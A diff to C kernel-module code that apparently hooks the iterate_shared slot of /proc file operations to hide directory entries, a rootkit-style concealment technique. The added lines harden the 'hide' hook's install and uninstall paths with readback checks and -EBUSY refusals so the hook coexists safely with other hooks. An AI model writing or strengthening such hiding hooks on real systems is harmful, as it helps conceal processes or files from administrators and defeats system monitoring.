@@ -222,6 +222,19 @@ static int install_hooks_on_fops(const struct file_operations *ops, iterate_shar
   {
      int wr;
      iterate_shared_fn back;
+     iterate_shared_fn live;
+
+     /* Refuse to clobber a third-party change: hook_proc_dir snapshotted
+      * orig_iter above, but the owner may have repointed the slot since
+      * (or hooked it itself). Installing over that would corrupt their
+      * chain; fail closed instead. Narrow TOCTOU remains against a
+      * concurrent owner write (no shared lock exists); the readback
+      * below is the backstop, and uninstall never restores blindly. */
+     live = (iterate_shared_fn)memd_iter_get(ops);
+     if (!live || live != orig_iter) {
+         memd_err("hide install: table changed since snapshot; refusing\n");
+         return -EBUSY;
+     }
 
      wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
                              (unsigned long)new_iter);
@@ -248,6 +261,26 @@ static int uninstall_hooks_from_fops(const struct file_operations *ops, iterate_
   {
      int wr;
      iterate_shared_fn back;
+     iterate_shared_fn live;
+
+     live = (iterate_shared_fn)memd_iter_get(ops);
+
+     /* Already showing our saved pointer (owner put it back, or a
+      * retried uninstall): nothing to do. */
+     if (live == orig_iter && live)
+         return 0;
+
+     /* Slot no longer points at us: the owner (or a stacked third-party
+      * hook) repointed it after install. Restoring the stale saved orig
+      * would clobber their live entry — possibly a pointer into a module
+      * that chains back into us — so refuse (-EBUSY) and keep the
+      * bookkeeping; a later uninstall retries once the slot is ours
+      * again. Restoring the MODIFIED value is never right here: only the
+      * slot owner may publish it, and we did not author it. */
+     if (!live || live != memd_iterate_shared) {
+         memd_err("hide uninstall: table owned by someone else; refusing\n");
+         return -EBUSY;
+     }
 
      wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
                              (unsigned long)orig_iter);
